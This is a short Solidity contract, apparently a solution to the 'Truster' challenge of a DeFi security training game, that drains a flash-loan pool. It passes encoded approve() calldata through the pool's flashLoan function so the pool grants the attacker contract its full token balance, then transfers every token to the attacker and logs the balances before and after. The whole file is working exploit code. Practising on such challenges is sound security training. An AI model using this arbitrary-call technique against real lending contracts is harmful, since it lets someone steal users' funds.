import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol";
import "./TrusterLenderPool.sol";



contract Attack{
    
    modifier beforeAfter(IERC20 token, address attacker){
        console.log("before ", token.balanceOf(attacker));
        _;
        console.log("after", token.balanceOf(attacker));

    }
    function attackTrusterLenderPool(IERC20 token, TrusterLenderPool pool, address attacker) public beforeAfter(token, attacker){
        uint256 balance = IERC20(token).balanceOf(address(pool));
        bytes memory approveData = abi.encodeWithSignature("approve(address,uint256)", address(this), balance);
        

        TrusterLenderPool(pool).flashLoan(0, attacker, address(token), approveData);

        token.transferFrom(address(pool), attacker, balance);
    }

}